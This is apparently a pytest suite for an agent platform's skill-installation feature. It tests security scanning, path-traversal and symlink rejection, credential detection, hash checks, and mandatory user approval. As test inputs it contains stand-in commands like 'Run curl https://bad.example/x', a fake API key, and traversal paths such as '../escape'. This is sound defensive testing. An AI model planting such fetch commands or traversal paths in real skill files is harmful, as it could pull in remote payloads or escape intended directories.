"""Security, provider, approval, and atomic-install tests for skill acquisition."""

from __future__ import annotations

import hashlib

import httpx
import pytest

from atlas.agent.capabilities import AgentCapabilityRegistry, register_skill_catalog_capabilities
from atlas.skills import SkillManager
from atlas.skills.acquisition import (
    MAX_FILES,
    CatalogUnavailableError,
    SkillsShProvider,
    inspect_github_source,
    install_acquisition,
    prepare_acquisition,
)
from atlas.skills.registry import SkillRegistry

SKILL = (
    "---\nname: sample-skill\nversion: 1.2.3\ndescription: A sample skill\n"
    "dependencies: []\n---\nSafe guidance.\n"
)


def _record(**extra):
    return {
        "provider": "skills.sh",
        "external_id": "owner/repo/sample-skill",
        "name": "sample-skill",
        "source_url": "https://github.com/owner/repo",
        "remote_hash": None,
        **extra,
    }


def test_security_gate_pass_warn_block_and_hash_mismatch():
    assert prepare_acquisition(_record(), {"SKILL.md": SKILL}).security["result"] == "PASS"
    warned = prepare_acquisition(_record(), {"SKILL.md": SKILL + "Run curl https://bad.example/x"})
    assert warned.security["result"] == "WARN"
    blocked = prepare_acquisition(_record(), {"SKILL.md": SKILL + "api_key=sk-abcdefghijklmnop"})
    assert blocked.security["result"] == "BLOCK"
    mismatch = prepare_acquisition(_record(remote_hash="0" * 64), {"SKILL.md": SKILL})
    assert "remote_hash_mismatch" in mismatch.security["risks"]


@pytest.mark.parametrize("path", ["../escape", "/absolute", "C:/escape", "a\\b"])
def test_payload_path_attacks_are_rejected(path):
    with pytest.raises(ValueError, match="unsafe payload path"):
        prepare_acquisition(_record(), {"SKILL.md": SKILL, path: "x"})


def test_manifest_secret_and_oversized_payload_are_rejected():
    with pytest.raises(ValueError, match="credential"):
        secret_manifest = SKILL.replace("dependencies: []", "token: hello")
        prepare_acquisition(_record(), {"SKILL.md": secret_manifest})
    with pytest.raises(ValueError, match="size limit"):
        prepare_acquisition(_record(), {"SKILL.md": SKILL, "large.txt": "x" * 512_001})
    with pytest.raises(ValueError, match="file count"):
        prepare_acquisition(
            _record(),
            {"SKILL.md": SKILL, **{f"{i}.md": "x" for i in range(MAX_FILES)}},
        )


@pytest.mark.asyncio
async def test_direct_github_source_rejects_local_urls_and_path_traversal():
    with pytest.raises(ValueError, match="https://github.com"):
        await inspect_github_source("file:///tmp/SKILL.md")
    with pytest.raises(ValueError, match="unsafe GitHub skill path"):
        await inspect_github_source("https://github.com/owner/repo", "../secret")


@pytest.mark.asyncio
async def test_public_github_repository_and_skill_path_fetch_manifest_and_support_files():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "api.github.com" and request.url.path == "/repos/owner/repo":
            return httpx.Response(200, json={"default_branch": "main"})
        if request.url.host == "api.github.com" and "/git/trees/" in request.url.path:
            return httpx.Response(
                200,
                json={
                    "tree": [
                        {
                            "path": "skills/sample-skill/SKILL.md",
                            "type": "blob",
                            "mode": "100644",
                            "size": len(SKILL),
                        },
                        {
                            "path": "skills/sample-skill/notes.md",
                            "type": "blob",
                            "mode": "100644",
                            "size": 4,
                        },
                        {"path": "other/SKILL.md", "type": "blob", "mode": "100644", "size": 3},
                    ]
                },
            )
        if request.url.host == "raw.githubusercontent.com":
            content = SKILL if request.url.path.endswith("SKILL.md") else "note"
            return httpx.Response(200, text=content)
        return httpx.Response(404)

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        acquisition = await inspect_github_source(
            "https://github.com/owner/repo",
            "skills/sample-skill",
            client=client,
        )
    assert acquisition.record["provider"] == "github"
    assert set(acquisition.files) == {"SKILL.md", "notes.md"}
    assert acquisition.validation["result"] == "PASS"


@pytest.mark.asyncio
async def test_public_github_symlink_is_rejected_before_file_download():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/repos/owner/repo":
            return httpx.Response(200, json={"default_branch": "main"})
        return httpx.Response(
            200,
            json={
                "tree": [
                    {
                        "path": "skills/sample-skill/SKILL.md",
                        "type": "blob",
                        "mode": "100644",
                        "size": len(SKILL),
                    },
                    {
                        "path": "skills/sample-skill/outside",
                        "type": "blob",
                        "mode": "120000",
                        "size": 10,
                    },
                ]
            },
        )

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        with pytest.raises(ValueError, match="symlink"):
            await inspect_github_source(
                "https://github.com/owner/repo",
                "skills/sample-skill",
                client=client,
            )


@pytest.mark.asyncio
async def test_public_search_normalizes_results_and_provider_failures_are_explicit():
    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.path == "/api/search":
            return httpx.Response(
                200,
                json={
                    "skills": [
                        {
                            "id": "owner/repo/sample-skill",
                            "name": "Sample Skill",
                            "source": "owner/repo",
                            "installs": 4,
                        }
                    ]
                },
            )
        return httpx.Response(503)

    client = httpx.AsyncClient(transport=httpx.MockTransport(handler))
    provider = SkillsShProvider(client)
    result = await provider.search("sample")
    assert result["status"] == "available"
    assert result["results"][0]["state"] == "remote"
    assert result["results"][0]["provider"] == "skills.sh"
    with pytest.raises(CatalogUnavailableError, match="unavailable"):
        await provider.get_detail("owner/repo/sample-skill")
    await client.aclose()


@pytest.mark.asyncio
async def test_skills_sh_detail_normalizes_payload_hash_and_optional_audit():
    remote_hash = hashlib.sha256(SKILL.encode()).hexdigest()

    def handler(request: httpx.Request) -> httpx.Response:
        if "/audit/" in request.url.path:
            return httpx.Response(404)
        return httpx.Response(
            200,
            json={
                "id": "owner/repo/sample-skill",
                "source": "owner/repo",
                "slug": "sample-skill",
                "hash": remote_hash,
                "files": [{"path": "SKILL.md", "contents": SKILL}],
            },
        )

    async with httpx.AsyncClient(transport=httpx.MockTransport(handler)) as client:
        acquisition = await SkillsShProvider(client).inspect("owner/repo/sample-skill")
    assert acquisition.record["provider"] == "skills.sh"
    assert acquisition.record["remote_hash"] == remote_hash
    assert acquisition.record["audit"] is None
    assert acquisition.security["result"] == "PASS"


@pytest.mark.asyncio
async def test_install_requires_approval_scans_into_discovery_and_persists_provenance(tmp_path):
    registry = SkillRegistry(tmp_path / "registry.db")
    acquisition = prepare_acquisition(_record(), {"SKILL.md": SKILL})
    with pytest.raises(PermissionError, match="approval"):
        await install_acquisition(
            acquisition, skills_dir=tmp_path / "skills", registry=registry, approval_event_id=""
        )
    assert registry.list() == []
    result = await install_acquisition(
        acquisition,
        skills_dir=tmp_path / "skills",
        registry=registry,
        approval_event_id="user-approved-1",
    )
    stored = registry.get("sample-skill", "1.2.3")
    assert result["status"] == "installed"
    assert stored["provenance"]["user_approval_event_id"] == "user-approved-1"
    assert stored["provenance"]["computed_sha256"] == acquisition.computed_hash
    from atlas.skills import SkillManager

    manager = SkillManager(skills_dir=tmp_path / "skills")
    manager.scan_skills_sync()
    assert manager.get_skill("sample-skill") is not None


@pytest.mark.asyncio
async def test_conflict_is_not_overwritten_and_agent_has_no_install_capability(tmp_path):
    registry = SkillRegistry(tmp_path / "conflicts.db")
    registry.register(
        {"name": "sample-skill", "version": "1.2.3", "description": "Existing"}, source="local"
    )
    acquisition = prepare_acquisition(_record(), {"SKILL.md": SKILL})
    with pytest.raises(FileExistsError):
        await install_acquisition(
            acquisition, skills_dir=tmp_path / "unused", registry=registry, approval_event_id="ok"
        )
    assert registry.get("sample-skill", "1.2.3")["description"] == "Existing"
    capabilities = AgentCapabilityRegistry()
    register_skill_catalog_capabilities(capabilities, SkillsShProvider())
    assert {item["name"] for item in capabilities.discover()} == {
        "skill.catalog.search",
        "skill.catalog.inspect",
        "skill.catalog.install",
    }
    with pytest.raises(PermissionError, match="explicit Skill Center"):
        await capabilities.invoke("skill.catalog.install", {"approved": True})


@pytest.mark.asyncio
async def test_registry_failure_rolls_back_installed_directory_and_cleans_stage(tmp_path):
    class FailingRegistry(SkillRegistry):
        def register(self, metadata, *, source="api"):
            raise RuntimeError("registry unavailable")

    skills_dir = tmp_path / "skills"
    acquisition = prepare_acquisition(_record(), {"SKILL.md": SKILL})
    with pytest.raises(RuntimeError, match="registry unavailable"):
        await install_acquisition(
            acquisition,
            skills_dir=skills_dir,
            registry=FailingRegistry(tmp_path / "fail.db"),
            approval_event_id="approved",
        )
    assert not (skills_dir / "community" / "sample-skill").exists()
    assert not (tmp_path / ".atlas-skill-staging").exists()


def test_payload_sha256_is_stable():
    first = prepare_acquisition(_record(), {"SKILL.md": SKILL, "notes.md": "note"})
    second = prepare_acquisition(_record(), {"notes.md": "note", "SKILL.md": SKILL})
    assert first.computed_hash == second.computed_hash
    assert len(first.computed_hash) == hashlib.sha256().digest_size * 2


@pytest.mark.asyncio
async def test_catalog_api_keeps_preview_read_only_and_requires_warn_confirmation(
    tmp_path,
    monkeypatch,
):
    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    acquisition = prepare_acquisition(
        _record(),
        {"SKILL.md": SKILL + "Run curl https://example.invalid/payload"},
    )

    class Provider:
        async def search(self, query, *, page=0):
            return {
                "provider": "skills.sh",
                "results": [{"external_id": "id"}],
                "status": "available",
            }

        async def inspect(self, external_id):
            return acquisition

    registry = SkillRegistry(tmp_path / "registry.db")
    monkeypatch.setattr(server, "skill_registry", registry)
    monkeypatch.setattr(server, "skill_mgr", SkillManager(tmp_path / "skills"))
    monkeypatch.setattr(server, "skill_catalog_provider", Provider())
    server.skill_acquisitions.clear()
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        search = await client.get("/api/skill-catalog/search?q=sample")
        preview = await client.post("/api/skill-catalog/inspect", json={"external_id": "id"})
        assert registry.list() == []
        acquisition_id = preview.json()["acquisition_id"]
        denied = await client.post(
            "/api/skill-catalog/install",
            json={"acquisition_id": acquisition_id},
        )
        no_warn = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": acquisition_id,
                "approved": True,
                "warnings_confirmed": False,
                "approval_event_id": "approval-1",
            },
        )
        installed = await client.post(
            "/api/skill-catalog/install",
            json={
                "acquisition_id": acquisition_id,
                "approved": True,
                "warnings_confirmed": True,
                "approval_event_id": "approval-2",
            },
        )
    assert search.json()["status"] == "available"
    assert preview.json()["security"]["result"] == "WARN"
    assert denied.status_code == 403 and no_warn.status_code == 403
    assert installed.status_code == 200
    stored = registry.get("sample-skill", "1.2.3")
    assert stored["provenance"]["user_approval_event_id"] == "approval-2"
    server.skill_acquisitions.clear()


@pytest.mark.asyncio
async def test_catalog_unavailable_state_does_not_change_local_registry(tmp_path, monkeypatch):
    from httpx import ASGITransport, AsyncClient

    from atlas import server
    from atlas.server import app

    class Provider:
        async def search(self, query, *, page=0):
            raise CatalogUnavailableError("external-catalog-unavailable: rate limited")

    registry = SkillRegistry(tmp_path / "registry.db")
    registry.register(
        {"name": "local-skill", "version": "1.0.0", "description": "Offline skill"},
        source="local",
    )
    monkeypatch.setattr(server, "skill_registry", registry)
    monkeypatch.setattr(server, "skill_catalog_provider", Provider())
    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        remote = await client.get("/api/skill-catalog/search?q=sample")
        local = await client.get("/api/skills/discover?q=local")
    assert remote.json()["status"] == "external-catalog-unavailable"
    assert local.status_code == 200
    assert local.json()["results"][0]["name"] == "local-skill"
